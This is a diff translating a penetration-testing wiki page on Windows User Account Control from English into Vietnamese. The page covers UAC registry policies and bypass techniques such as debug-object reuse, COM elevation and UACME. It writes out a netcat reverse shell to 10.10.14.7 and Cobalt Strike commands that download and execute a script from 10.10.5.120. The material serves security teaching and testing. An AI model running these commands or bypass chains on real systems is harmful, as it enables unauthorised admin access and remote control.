@@ -1,61 +1,61 @@
-# UAC - User Account Control
+# UAC - Kiểm soát Tài khoản Người dùng
 
 {{#include ../../banners/hacktricks-training.md}}
 
 ## UAC
 
-[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) is a feature that enables a **consent prompt for elevated activities**. Applications have different `integrity` levels, and a program with a **high level** can perform tasks that **could potentially compromise the system**. When UAC is enabled, applications and tasks always **run under the security context of a non-administrator account** unless an administrator explicitly authorizes these applications/tasks to have administrator-level access to the system to run. It is a convenience feature that protects administrators from unintended changes but is not considered a security boundary.<sup>[[2]](#references)</sup>
+[Kiểm soát Tài khoản Người dùng (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) là một tính năng hiển thị **lời nhắc xác nhận đối với các hoạt động cần nâng quyền**. Các ứng dụng có các mức `integrity` khác nhau, và một chương trình có **mức cao** có thể thực hiện những tác vụ **có khả năng làm tổn hại hệ thống**. Khi bật UAC, các ứng dụng và tác vụ luôn **chạy trong ngữ cảnh bảo mật của tài khoản không phải quản trị viên**, trừ khi quản trị viên cho phép rõ ràng các ứng dụng/tác vụ đó có quyền truy cập cấp quản trị viên vào hệ thống để chạy. Đây là một tính năng tiện ích giúp bảo vệ quản trị viên khỏi những thay đổi ngoài ý muốn, nhưng không được xem là ranh giới bảo mật.<sup>[[2]](#references)</sup>
 
-For more info about integrity levels:
+Để biết thêm thông tin về các mức integrity:
 
 
 {{#ref}}
 ../windows-local-privilege-escalation/integrity-levels.md
 {{#endref}}
 
-When UAC is in place, an administrator user is given 2 tokens: a standard user token, to perform regular actions at medium integrity, and one with the admin privileges.
+Khi UAC được bật, người dùng quản trị viên sẽ được cấp 2 token: một token người dùng tiêu chuẩn để thực hiện các thao tác thông thường ở mức integrity trung bình, và một token có quyền quản trị viên.
 
-This [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) discusses how UAC works in great depth and includes the logon process, user experience, and UAC architecture.<sup>[[2]](#references)</sup> Administrators can use security policies to configure how UAC works specific to their organization at the local level (using secpol.msc), or configured and pushed out via Group Policy Objects (GPO) in an Active Directory domain environment. The various settings are discussed in detail [here](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). There are 10 Group Policy settings that can be set for UAC. The following table provides additional detail:
+[Trang này](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) thảo luận rất chi tiết về cách UAC hoạt động, bao gồm quy trình đăng nhập, trải nghiệm người dùng và kiến trúc UAC.<sup>[[2]](#references)</sup> Quản trị viên có thể sử dụng các chính sách bảo mật để cấu hình cách UAC hoạt động phù hợp với tổ chức ở cấp cục bộ (bằng secpol.msc), hoặc cấu hình rồi triển khai qua Group Policy Objects (GPO) trong môi trường domain Active Directory. Các cài đặt khác nhau được thảo luận chi tiết [tại đây](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Có 10 cài đặt Group Policy có thể được thiết lập cho UAC. Bảng sau cung cấp thêm chi tiết:
 
-| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
+| Cài đặt Group Policy                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Cài đặt mặc định                                              |
 | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
-| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Disabled)                                             |
-| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Prompt for consent for non-Windows binaries on the secure desktop) |
-| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Prompt for credentials on the secure desktop)         |
-| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Enabled; disabled by default on Enterprise)           |
-| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Disabled)                                             |
-| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Enabled)                                              |
-| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Enabled)                                              |
-| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Disabled)                                             |
-| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Enabled)                                              |
-| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Enabled)                                              |
+| [Kiểm soát Tài khoản Người dùng: Chế độ phê duyệt của quản trị viên cho tài khoản Administrator tích hợp sẵn](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Đã tắt)                                             |
+| [Kiểm soát Tài khoản Người dùng: Cách xử lý lời nhắc nâng quyền đối với quản trị viên ở Chế độ phê duyệt của quản trị viên](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Yêu cầu xác nhận đối với tệp nhị phân không phải Windows trên secure desktop) |
+| [Kiểm soát Tài khoản Người dùng: Cách xử lý lời nhắc nâng quyền đối với người dùng tiêu chuẩn](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Yêu cầu thông tin xác thực trên secure desktop)         |
+| [Kiểm soát Tài khoản Người dùng: Phát hiện cài đặt ứng dụng và yêu cầu nâng quyền](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Đã bật; mặc định tắt trên Enterprise)           |
+| [Kiểm soát Tài khoản Người dùng: Chỉ nâng quyền cho các tệp thực thi đã được ký và xác thực](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Đã tắt)                                             |
+| [Kiểm soát Tài khoản Người dùng: Chỉ nâng quyền cho các ứng dụng UIAccess được cài đặt ở vị trí an toàn](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Đã bật)                                              |
+| [Kiểm soát Tài khoản Người dùng: Chạy tất cả quản trị viên ở Chế độ phê duyệt của quản trị viên](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Đã bật)                                              |
+| [Kiểm soát Tài khoản Người dùng: Cho phép ứng dụng UIAccess yêu cầu nâng quyền mà không dùng secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Đã tắt)                                             |
+| [Kiểm soát Tài khoản Người dùng: Chuyển sang secure desktop khi yêu cầu nâng quyền](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Đã bật)                                              |
+| [Kiểm soát Tài khoản Người dùng: Ảo hóa lỗi ghi tệp và registry vào các vị trí riêng cho từng người dùng](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Đã bật)                                              |
 
-### Policies for installing software on Windows
+### Chính sách cài đặt phần mềm trên Windows
 
-The **local security policies** ("secpol.msc" on most systems) are configured by default to **prevent non-admin users from performing software installations**. This means that even if a non-admin user can download the installer for your software, they won't be able to run it without an admin account.
+**Các chính sách bảo mật cục bộ** (trên hầu hết hệ thống là "secpol.msc") được cấu hình mặc định để **ngăn người dùng không phải quản trị viên cài đặt phần mềm**. Điều này có nghĩa là dù người dùng không phải quản trị viên có thể tải trình cài đặt phần mềm của bạn xuống, họ cũng không thể chạy nó nếu không có tài khoản quản trị viên.
 
-### Registry Keys to Force UAC to Ask for Elevation
+### Registry Key để buộc UAC yêu cầu nâng quyền
 
-As a standard user with no admin rights, you can make sure the "standard" account is **prompted for credentials by UAC** when it attempts to perform certain actions. This action would require modifying certain **registry keys**, for which you need admin permissions, unless there is a **UAC bypass**, or the attacker is already logged as admin.
+Là người dùng tiêu chuẩn không có quyền quản trị viên, bạn có thể đảm bảo tài khoản "tiêu chuẩn" **được UAC yêu cầu cung cấp thông tin xác thực** khi cố thực hiện một số thao tác nhất định. Thao tác này cần sửa một số **registry key**, việc đó đòi hỏi quyền quản trị viên, trừ khi có **UAC bypass**, hoặc kẻ tấn công đã đăng nhập với quyền quản trị viên.
 
-Even if the user is in the **Administrators** group, these changes force the user to **re-enter their account credentials** in order to perform administrative actions.
+Ngay cả khi người dùng thuộc nhóm **Administrators**, những thay đổi này vẫn buộc người dùng **nhập lại thông tin xác thực tài khoản** để thực hiện các thao tác quản trị.
 
-**In practice this is only useful once you already have an elevated token, a UAC bypass, or a misconfiguration that lets you change these keys; otherwise the registry write itself is blocked.**
+**Trên thực tế, việc này chỉ hữu ích khi bạn đã có token được nâng quyền, UAC bypass hoặc có cấu hình sai cho phép bạn thay đổi các key này; nếu không, thao tác ghi vào registry sẽ bị chặn.**
 
-The registry keys and entries that you must change are the following (with their default values in parentheses):
+Các registry key và mục cần thay đổi như sau (giá trị mặc định nằm trong ngoặc đơn):
 
 - `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
   - `ConsentPromptBehaviorUser` = 1 (3)
   - `ConsentPromptBehaviorAdmin` = 1 (5)
   - `PromptOnSecureDesktop` = 1 (1)
 
-This can also be done manually through the Local Security Policy tool. Once changed, administrative operations prompt the user to re-enter their credentials.
+Bạn cũng có thể thực hiện việc này thủ công bằng công cụ Local Security Policy. Sau khi thay đổi, các thao tác quản trị sẽ yêu cầu người dùng nhập lại thông tin xác thực.
 
-### Note
+### Lưu ý
 
-**User Account Control is not a security boundary.** Therefore, standard users cannot break out of their accounts and gain administrator rights without a local privilege escalation exploit.
+**User Account Control không phải là ranh giới bảo mật.** Vì vậy, người dùng tiêu chuẩn không thể thoát khỏi tài khoản của mình và giành quyền quản trị viên nếu không có exploit leo thang đặc quyền cục bộ.
 
-### Ask for 'full computer access' to a user
+### Yêu cầu người dùng 'toàn quyền truy cập máy tính'
 
 ```powershell
 hostname | Set-Clipboard
@@ -66,36 +66,36 @@ New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
 Enter-PSSession -ComputerName hostname
 ```
 
-### UAC Privileges
+### Đặc quyền UAC
 
-- Internet Explorer Protected Mode uses integrity checks to prevent high-integrity-level processes (like web browsers) from accessing low-integrity-level data (like the temporary Internet files folder). This is done by running the browser with a low-integrity token. When the browser attempts to access data stored in the low-integrity zone, the operating system checks the integrity level of the process and allows access accordingly. This feature helps prevent remote code execution attacks from gaining access to sensitive data on the system.
-- When a user logs on to Windows, the system creates an access token that contains a list of the user's privileges. Privileges are defined as the combination of a user's rights and capabilities. The token also contains a list of the user's credentials, which are credentials that are used to authenticate the user to the computer and to resources on the network.
+- Internet Explorer Protected Mode sử dụng các kiểm tra mức toàn vẹn để ngăn các tiến trình có mức toàn vẹn cao (như trình duyệt web) truy cập dữ liệu có mức toàn vẹn thấp (như thư mục Temporary Internet Files). Việc này được thực hiện bằng cách chạy trình duyệt với token có mức toàn vẹn thấp. Khi trình duyệt cố truy cập dữ liệu được lưu trong vùng có mức toàn vẹn thấp, hệ điều hành sẽ kiểm tra mức toàn vẹn của tiến trình và cấp quyền truy cập phù hợp. Tính năng này giúp ngăn các cuộc tấn công thực thi mã từ xa truy cập dữ liệu nhạy cảm trên hệ thống.
+- Khi người dùng đăng nhập vào Windows, hệ thống tạo một access token chứa danh sách đặc quyền của người dùng. Đặc quyền là sự kết hợp giữa quyền và khả năng của người dùng. Token cũng chứa danh sách thông tin xác thực của người dùng; đây là thông tin được dùng để xác thực người dùng với máy tính và các tài nguyên trên mạng.
 
 ### Autoadminlogon
 
-To configure Windows to automatically log on a specific user at startup, set the **`AutoAdminLogon` registry key**. This is useful for kiosk environments or for testing purposes. Use this only on secure systems, as it exposes the password in the registry.
+Để cấu hình Windows tự động đăng nhập một người dùng cụ thể khi khởi động, hãy đặt **registry key `AutoAdminLogon`**. Tính năng này hữu ích trong môi trường kiosk hoặc khi kiểm thử. Chỉ sử dụng tính năng này trên các hệ thống an toàn vì mật khẩu sẽ bị lộ trong registry.
 
-Set the following keys using the Registry Editor or `reg add`:
+Đặt các key sau bằng Registry Editor hoặc `reg add`:
 
 - `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
   - `AutoAdminLogon` = 1
   - `DefaultUsername` = username
   - `DefaultPassword` = password
 
-To revert to normal logon behavior, set `AutoAdminLogon` to 0.
+Để khôi phục cách đăng nhập thông thường, đặt `AutoAdminLogon` thành 0.
 
 ## UAC bypass
 
 > [!TIP]
-> Note that if you have graphical access to the victim, UAC bypass is straight forward as you can simply click on "Yes" when the UAC prompt appears
+> Lưu ý rằng nếu bạn có quyền truy cập giao diện đồ họa của máy nạn nhân, UAC bypass rất đơn giản vì bạn chỉ cần nhấp vào "Yes" khi lời nhắc UAC xuất hiện
 
-The UAC bypass is needed in the following situation: **the UAC is activated, your process is running in a medium integrity context, and your user belongs to the administrators group**.
+UAC bypass cần thiết trong trường hợp sau: **UAC đang được bật, process của bạn đang chạy trong ngữ cảnh có mức toàn vẹn trung bình và người dùng của bạn thuộc nhóm administrators**.
 
-It is important to mention that it is **much harder to bypass the UAC if it is in the highest security level (Always) than if it is in any of the other levels (Default).**
+Điều quan trọng cần lưu ý là **bypass UAC khó hơn nhiều nếu UAC đang ở mức bảo mật cao nhất (Always) so với các mức khác (Default).**
 
-### Fast triage from a medium-integrity shell
+### Phân loại nhanh từ shell có mức toàn vẹn trung bình
 
-Before trying a bypass, confirm you are in the right scenario and map the host build to known working methods:
+Trước khi thử bypass, hãy xác nhận bạn đang ở đúng tình huống và xác định build của máy chủ để tìm các phương pháp đã biết là hoạt động:
 
 ```powershell
 whoami /groups
@@ -106,14 +106,14 @@ powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVers
 schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
 ```
 
-Practical notes:
-- If `EnableLUA=0`, you do not need a bypass: any admin token can request high integrity directly.
-- `ConsentPromptBehaviorAdmin=2` or `5` is the common scenario for auto-elevate / COM-based bypasses.
-- `Always Notify` raises the bar, but you should still test the exact build instead of assuming failure: UACME still tracks some `AlwaysNotify compatible` methods on modern Windows builds.<sup>[[3]](#references)</sup>
+Ghi chú thực tế:
+- Nếu `EnableLUA=0`, bạn không cần bypass: bất kỳ admin token nào cũng có thể trực tiếp yêu cầu mức toàn vẹn cao.
+- `ConsentPromptBehaviorAdmin=2` hoặc `5` là kịch bản phổ biến đối với các bypass auto-elevate / dựa trên COM.
+- `Always Notify` làm tăng độ khó, nhưng bạn vẫn nên kiểm tra chính xác build thay vì mặc định rằng sẽ thất bại: UACME vẫn theo dõi một số phương thức `AlwaysNotify compatible` trên các build Windows hiện đại.<sup>[[3]](#references)</sup>
 
-### UAC disabled
+### UAC bị tắt
 
-If UAC is already disabled (`ConsentPromptBehaviorAdmin` is **`0`**) you can **execute a reverse shell with admin privileges** (high integrity level) using something like:
+Nếu UAC đã bị tắt (`ConsentPromptBehaviorAdmin` là **`0`**), bạn có thể **thực thi reverse shell với quyền quản trị** (mức toàn vẹn cao) bằng cách dùng lệnh như:
 
 ```bash
 #Put your reverse shell instead of "calc.exe"
@@ -121,31 +121,31 @@ Start-Process powershell -Verb runAs "calc.exe"
 Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
 ```
 
-#### UAC bypass with token duplication
+#### UAC bypass với token duplication
 
 - [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
 - [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)
 
 ### Local RPC + reusable debug object
 
-The AppInfo local RPC interface `201ef99a-7fa0-444c-9399-19ba84f12a1a` can create a process with debugging enabled. Processes debug-created on the same thread share the thread's debug object; a creation debug event carries a full-access process handle even when the RPC result itself grants only limited access. This turns debug-object reuse into a UAC primitive for a medium-integrity member of the Administrators group.<sup>[[11]](#references)[[12]](#references)</sup>
+Giao diện local RPC của AppInfo `201ef99a-7fa0-444c-9399-19ba84f12a1a` có thể tạo process với debugging được bật. Các process được tạo bằng debugging trên cùng thread sẽ dùng chung debug object của thread; một creation debug event mang theo process handle có quyền truy cập đầy đủ, ngay cả khi kết quả RPC chỉ cấp quyền truy cập hạn chế. Điều này biến việc tái sử dụng debug object thành một primitive UAC cho thành viên nhóm Administrators có mức integrity trung bình.<sup>[[11]](#references)[[12]](#references)</sup>
 
-A practical chain is:<sup>[[11]](#references)[[12]](#references)</sup>
+Một chuỗi thực hiện thực tế là:<sup>[[11]](#references)[[12]](#references)</sup>
 
-1. Call the local RPC method (directly or through `NdrAsyncClientCall`) to create a non-elevated sacrificial process with debugging enabled.
-2. Query `ProcessDebugObjectHandle` with `NtQueryInformationProcess`, detach it with `NtRemoveProcessDebug`, retain the object, and terminate the sacrificial process.
-3. Use the same RPC interface to create a trusted auto-elevated process, then associate the saved object with the calling thread through `DbgUiSetThreadDebugObject`.
-4. Call `WaitForDebugEvent` and take the `CREATE_PROCESS_DEBUG_EVENT` process handle; duplicate it with `NtDuplicateObject` before continuing.
-5. Supply the duplicated handle to `UpdateProcThreadAttribute(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, ...)` and launch the payload with an extended startup-info structure. This both reuses the elevated process context and gives the child a trusted-looking parent relationship.
+1. Gọi phương thức local RPC (trực tiếp hoặc qua `NdrAsyncClientCall`) để tạo một process hy sinh không được elevated, với debugging được bật.
+2. Truy vấn `ProcessDebugObjectHandle` bằng `NtQueryInformationProcess`, detach nó bằng `NtRemoveProcessDebug`, giữ lại object rồi terminate process hy sinh.
+3. Dùng cùng giao diện RPC để tạo một process auto-elevated đáng tin cậy, sau đó gắn object đã lưu với thread gọi thông qua `DbgUiSetThreadDebugObject`.
+4. Gọi `WaitForDebugEvent` và lấy process handle từ `CREATE_PROCESS_DEBUG_EVENT`; duplicate handle này bằng `NtDuplicateObject` trước khi tiếp tục.
+5. Cung cấp handle đã duplicate cho `UpdateProcThreadAttribute(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, ...)` và khởi chạy payload bằng cấu trúc startup-info mở rộng. Cách này vừa tái sử dụng ngữ cảnh của process elevated, vừa khiến process cha của child có vẻ đáng tin cậy.
 
-Hunt for the short sequence rather than only the auto-elevated binary: local AppInfo RPC process creation, `ProcessDebugObjectHandle` queries, debugger detach/reattach, an immediate creation-debug event, handle duplication, and a child whose recorded parent does not match the process that performed the creation APIs.<sup>[[12]](#references)</sup>
+Hãy tìm chuỗi thao tác ngắn này, thay vì chỉ tìm binary auto-elevated: tạo process qua local AppInfo RPC, truy vấn `ProcessDebugObjectHandle`, detach/reattach debugger, nhận creation-debug event ngay sau đó, duplicate handle, và một child có parent được ghi nhận không trùng với process đã gọi các API tạo process.<sup>[[12]](#references)</sup>
 
-### **Very** Basic UAC "bypass" (full file system access)
+### **Very** Basic UAC "bypass" (toàn quyền truy cập file system)
 
-If you have a shell with a user that is inside the Administrators group you can **mount the C$** shared via SMB (file system) local in a new disk and you will have **access to everything inside the file system** (even Administrator home folder).
+Nếu bạn có shell với một user thuộc nhóm Administrators, bạn có thể **mount** shared **C$** qua SMB (file system) vào một ổ đĩa mới trên máy local và sẽ có **quyền truy cập mọi thứ bên trong file system** (kể cả thư mục home của Administrator).
 
 > [!WARNING]
-> **Looks like this trick isn't working anymore**
+> **Có vẻ như thủ thuật này không còn hoạt động nữa**
 
 ```bash
 net use Z: \\127.0.0.1\c$
@@ -155,9 +155,9 @@ cd C$
 dir \\127.0.0.1\c$\Users\Administrator\Desktop
 ```
 
-### UAC bypass with cobalt strike
+### UAC bypass với Cobalt Strike
 
-The Cobalt Strike techniques will only work if UAC is not set at its max security level
+Các kỹ thuật của Cobalt Strike chỉ hoạt động nếu UAC không được đặt ở mức bảo mật cao nhất.
 
 ```bash
 # UAC bypass via token duplication
@@ -171,27 +171,27 @@ runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-obj
 runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
 ```
 
-**Empire** and **Metasploit** also have several modules to **bypass** the **UAC**.
+**Empire** và **Metasploit** cũng có một số module để **bypass** **UAC**.
 
-### Elevated COM interfaces (`ICMLuaUtil` / `CMSTPLUA`)
+### Giao diện COM được nâng quyền tự động (`ICMLuaUtil` / `CMSTPLUA`)
 
-Auto-elevated COM objects remain a practical UAC surface on modern builds. `ICMLuaUtil` is still tracked by UACME as working on current Windows branches, and offensive tooling keeps adapting `CMSTPLUA` by combining an interactive desktop process, 64-bit execution, and sometimes PEB/process masquerading before invoking the COM Elevation Moniker.<sup>[[3]](#references)</sup>
+Các đối tượng COM được nâng quyền tự động vẫn là một bề mặt UAC thực tế trên các bản dựng hiện đại. UACME vẫn ghi nhận `ICMLuaUtil` là hoạt động trên các nhánh Windows hiện tại, còn các công cụ tấn công liên tục điều chỉnh `CMSTPLUA` bằng cách kết hợp một tiến trình trên desktop tương tác, thực thi 64-bit và đôi khi giả mạo PEB/tiến trình trước khi gọi COM Elevation Moniker.<sup>[[3]](#references)</sup>
 
-Practical tips:
-- Prefer a **64-bit** process in the user's **interactive session** (commonly `explorer.exe` or a child of it).
-- If a raw shell fails, retry from a BOF / UACME implementation instead of a naive `CreateProcess` wrapper.
-- Expect child execution to occur in a **separate elevated process**; many BOFs do not elevate the current beacon in-place.
+Mẹo thực tế:
+- Ưu tiên tiến trình **64-bit** trong **phiên tương tác** của người dùng (thường là `explorer.exe` hoặc tiến trình con của nó).
+- Nếu shell thô không hoạt động, hãy thử lại bằng triển khai BOF / UACME thay vì một wrapper `CreateProcess` đơn giản.
+- Dự kiến tiến trình con sẽ chạy trong một **tiến trình được nâng quyền riêng biệt**; nhiều BOF không nâng quyền cho beacon hiện tại ngay trong tiến trình đó.
 
 ### KRBUACBypass
 
-Documentation and tool in [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)
+Tài liệu và công cụ tại [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)
 
-### UAC bypass exploits
+### Khai thác bypass UAC
 
-[**UACME**](https://github.com/hfiref0x/UACME) is a collection of UAC bypass techniques. Compile it with Visual Studio or MSBuild; the build creates several executables (for example, `Source\Akagi\output\x64\Debug\Akagi.exe`), so select the method appropriate to the target build.<sup>[[3]](#references)</sup>\
-Be careful: some bypasses launch visible programs or prompts that can alert the user.<sup>[[3]](#references)</sup>
+[**UACME**](https://github.com/hfiref0x/UACME) là tập hợp các kỹ thuật bypass UAC. Biên dịch bằng Visual Studio hoặc MSBuild; quá trình build tạo ra một số tệp thực thi (ví dụ: `Source\Akagi\output\x64\Debug\Akagi.exe`), vì vậy hãy chọn phương thức phù hợp với bản dựng mục tiêu.<sup>[[3]](#references)</sup>\
+Hãy cẩn thận: một số kỹ thuật bypass khởi chạy chương trình hiển thị hoặc lời nhắc có thể khiến người dùng chú ý.<sup>[[3]](#references)</sup>
 
-UACME has the **build version from which each technique started working**.<sup>[[3]](#references)</sup> You can search for a technique affecting your versions:
+UACME có **phiên bản build bắt đầu hỗ trợ từng kỹ thuật**.<sup>[[3]](#references)</sup> Bạn có thể tìm kiếm kỹ thuật ảnh hưởng đến các phiên bản của mình:
 
 ```powershell
 PS C:\> [environment]::OSVersion.Version
@@ -201,27 +201,27 @@ Major  Minor  Build  Revision
 10     0      14393  0
 ```
 
-Also, using [this](https://en.wikipedia.org/wiki/Windows_10_version_history) page you get the Windows release `1607` from the build versions.
+Ngoài ra, sử dụng [trang này](https://en.wikipedia.org/wiki/Windows_10_version_history), bạn có thể xác định Windows release `1607` từ các phiên bản build.
 
-A practical workflow is to first **score the host build**, and only then fire the matching method:
+Quy trình thực tế là trước tiên **đánh giá build của host**, rồi mới thực hiện method phù hợp:
 
 ```cmd
 python main.py --scan uac
 Akagi64.exe 33 C:\Windows\System32\cmd.exe
 ```
 
-- `WinPwnage` quickly compares the local build against its known UAC methods, which is useful to discard dead PoCs fast.<sup>[[4]](#references)</sup>
-- `UACME` remains the best public catalogue to map a bypass to a precise build. Version 3.7.1 added methods 83–85, while the preceding release re-tested existing methods against **Windows 11 25H2**; re-check the method table and release notes instead of assuming an old PoC still applies unchanged.<sup>[[3]](#references)[[9]](#references)</sup>
+- `WinPwnage` nhanh chóng so sánh build cục bộ với các phương thức UAC đã biết, hữu ích để nhanh chóng loại bỏ các PoC không còn hoạt động.<sup>[[4]](#references)</sup>
